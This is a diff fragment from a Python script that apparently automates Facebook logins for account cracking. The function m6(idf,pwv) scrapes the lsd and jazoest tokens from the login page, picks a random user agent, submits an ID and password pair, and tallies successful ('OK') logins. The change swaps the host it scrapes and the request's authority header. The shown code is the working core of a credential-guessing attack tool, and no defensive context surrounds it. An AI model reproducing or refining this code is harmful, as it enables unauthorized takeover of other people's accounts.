@@ -1212,7 +1212,7 @@ def m6(idf,pwv):
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
             #sys.stdout.flush()
    pro = random.choice(ugen)
-   free_fb = session.get('https://www.facebook.com').text
+   free_fb = session.get('https://free.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1224,7 +1224,7 @@ def m6(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-            'authority': 'm.facebook.com',
+            'authority': 'www.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
